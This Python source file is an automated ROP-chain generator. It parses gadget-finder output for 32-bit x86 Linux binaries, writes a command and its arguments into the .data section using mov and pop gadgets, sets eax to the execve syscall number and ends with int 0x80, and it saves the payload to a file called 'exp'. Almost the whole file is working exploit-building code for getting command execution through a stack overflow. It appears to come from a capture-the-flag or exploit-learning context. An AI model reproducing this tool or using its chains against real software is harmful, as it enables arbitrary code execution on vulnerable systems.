import io
import re
import math
from struct import pack

# Look for add eax, <reg>
#        + mov <stack> eax gadgets for allowing zero bytes in target addresses

# Challenge, find a way to offset stack reg value to allow for zero bytes in addresses. Large chain of 'inc'/'dec' instructions may overflow stack

class ParseChain():
    def __init__(self) -> None:
        self.DST_REG = 'edx'
        self.SRC_REG = 'eax'
        self.PDST = ''
        self.PSRC = ''
        self.PEBX = ''
        self.PECX = ''
        self.PEDX = ''
        self.POP_EBX = None
        self.POP_ECX = None
        self.POP_EDX = None
        pass

    def parse_gadget(self, gadget):
        print(gadget)
        regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})) ; ret", gadget)
        if regex:
            self.DST_REG = gadget.split('[')[1].split(']')[0]
            self.SRC_REG = gadget.split(',')[1].split(';')[0].strip()
            self.MOVSTACK = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        
        regex = re.search('pop ' + self.DST_REG, gadget)
        if regex and self.DST_REG not in ['ebx', 'ecx', 'edx']:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ' + self.DST_REG:
                    self.POP_DST_REG = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PDST += 'B'
                elif ins.split(' ')[0] == 'pop':
                    self.PDST += 'A'
                elif ins == 'ret': return True
            return False
        
        regex = re.search('pop ' + self.SRC_REG, gadget)
        if regex and self.SRC_REG not in ['ebx', 'ecx', 'edx']:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ' + self.SRC_REG:
                    self.POP_SRC_REG = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PSRC += 'B'
                elif ins.split(' ')[0] == 'pop':
                    self.PSRC += 'A'
                elif ins == 'ret': return True
            return False
        
        regex = re.search('xor ' + self.SRC_REG + ", " + self.SRC_REG + ' ; ret', gadget)
        if regex and self.SRC_REG != 'eax':
            self.XOR_SRC = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        
        regex = re.search('xor eax, eax ; ret', gadget)
        if regex:
            self.XOR_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            if self.SRC_REG == 'eax': self.XOR_SRC = self.XOR_EAX
            return True
        
        regex = re.search('inc eax ; ret', gadget)
        if regex:
            self.INC_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            return True
        
        regex = re.search('pop ebx', gadget)
        if regex and not self.POP_EBX:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ebx':
                    self.POP_EBX = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PEBX += 'B'
                elif ins.split(' ')[0] == 'pop':
                    self.PEBX += ins.split(' ')[1][1:2].upper()
                elif ins.strip() == 'ret': 
                    if self.DST_REG == 'ebx':
                        self.POP_DST_REG = self.POP_EBX
                        self.PDST = self.PEBX
                    elif self.SRC_REG == 'ebx':
                        self.POP_SRC_REG = self.POP_EBX
                        self.PSRC = self.PEBX
                    return True
            return False
        
        regex = re.search('pop ecx', gadget)
        if regex and not self.POP_ECX:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop ecx':
                    self.POP_ECX = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PECX += 'C'
                elif ins.split(' ')[0] == 'pop':
                    self.PECX += ins.split(' ')[1][1:2].upper()
                elif ins.strip() == 'ret': 
                    if self.DST_REG == 'ecx':
                        self.POP_DST_REG = self.POP_ECX
                        self.PDST = self.PECX
                    elif self.SRC_REG == 'ecx':
                        self.POP_SRC_REG = self.POP_ECX
                        self.PSRC = self.PECX
                    return True
            return False
        
        regex = re.search('pop edx', gadget)
        if regex and not self.POP_EDX:
            instructions = ' '.join(gadget.split(' ')[1:]).split(' ; ')
            for ins in instructions:
                if ins == 'pop edx':
                    self.POP_EDX = pack('<I', int(gadget.split(' ')[0], 16))
                    self.PEDX += 'D'
                elif ins.split(' ')[0] == 'pop':
                    self.PEDX += ins.split(' ')[1][1:2].upper()
                elif ins.strip() == 'ret': 
                    if self.DST_REG == 'edx':
                        self.POP_DST_REG = self.POP_EDX
                        self.PDST = self.PEDX
                    elif self.SRC_REG == 'edx':
                        self.POP_SRC_REG = self.POP_EDX
                        self.PSRC = self.PEDX
                    return True
            return False

        regex = re.search('int 0x80', gadget)
        if regex:
            self.INT_80 = pack('<I', int(gadget.split(' ')[0], 16))
            return
        
    def parse_data_loc(self, data_loc):
        self.DATA = int(data_loc, 16)

    def pad_pop_dst(self, data):
        p = self.POP_DST_REG
        reg_id = 'B'
        if self.DST_REG in ['ebx', 'ecx', 'edx']: reg_id = self.DST_REG[1:2].upper()
        for r in self.PDST:
            if r == reg_id: p += data
            else: p += pack('<I', 0x41414141)
        return p
    
    def pad_pop_src(self, data):
        p = self.POP_SRC_REG
        reg_id = 'B'
        if self.SRC_REG in ['ebx', 'ecx', 'edx']: reg_id = self.SRC_REG[1:2].upper()
        for r in self.PSRC:
            if r == reg_id: p += data
            else: p += pack('<I', 0x41414141)
        return p



    def build_stack_str(self, p, s, offset):
        bound = math.ceil(len(s) / 4)
        for i in range(0, bound):
            p += self.pad_pop_dst(pack('<I', self.DATA + offset + i*4))
            d = str.encode(s[i*4:i*4+4]) if i*4+4 <= len(s) else str.encode(s[i*4:len(s)]) + b'A' * (bound*4 - len(s))
            p += self.pad_pop_src(d)
            p += self.MOVSTACK
        
        p += self.pad_pop_dst(pack('<I', self.DATA + offset + len(s)))
        p += self.XOR_SRC
        p += self.MOVSTACK

        return p
        
    def make_chain(self, cmd='', args=[], padding = 0):
        p = b'A'*padding

        offset = 0
        shadow_offset = 100

        p = self.build_stack_str(p, cmd, offset)

        p += self.pad_pop_dst(pack('<I', self.DATA + shadow_offset))
        p += self.pad_pop_src(pack('<I', self.DATA + offset))
        p += self.MOVSTACK

        shadow_offset += 4

        offset += len(cmd) + 1
        for arg in args:
            p = self.build_stack_str(p, arg, offset)

            p += self.pad_pop_dst(pack('<I', self.DATA + shadow_offset))
            p += self.pad_pop_src(pack('<I', self.DATA + offset))
            p += self.MOVSTACK

            shadow_offset += 4
            offset += len(arg) + 1

        p += self.pad_pop_dst(pack('<I', self.DATA + shadow_offset))
        p += self.XOR_SRC
        p += self.MOVSTACK

        p += self.POP_EBX
        print(self.PEBX)
        for r in self.PEBX:
            if r == 'B': p += pack('<I', self.DATA)
            else: p += pack('<I', 0x41414141)

        p += self.POP_ECX
        print(self.PECX)
        for r in self.PECX:
            if r == 'B': p += pack('<I', self.DATA)
            elif r == 'C': p += pack('<I', self.DATA + 100)
            else: p += pack('<I', 0x41414141)

        p += self.POP_EDX
        print(self.PEDX)
        for r in self.PEDX:
            if r == 'B': p += pack('<I', self.DATA)
            elif r == 'C': p += pack('<I', self.DATA + 100)
            elif r == 'D': p += pack('<I', self.DATA + shadow_offset)
            else: p += pack('<I', 0x41414141)

        p += self.XOR_EAX
        for _ in range(0, 11): p += self.INC_EAX
        p += self.INT_80

        return p


    def write_chain(self, chain):
        out_file = open('exp', 'wb')
        out_file.write(chain)


    def start(self, stdout, cmd, args, padding):
        for line in stdout:
            regex = re.search("Gadget found", line)
            if regex: self.parse_gadget(line.split(":")[1][1:])
            regex = re.search("# @ .data\n", line)
            if regex: self.parse_data_loc(line.split(",")[1][1:11])
            regex = re.search("add eax, (?P<src>([(ebx)|(ecx)|(edx)]{3})) ; ret", line)
            if regex: print(line)
        
        chain = self.make_chain(cmd, args, padding)
        self.write_chain(chain)
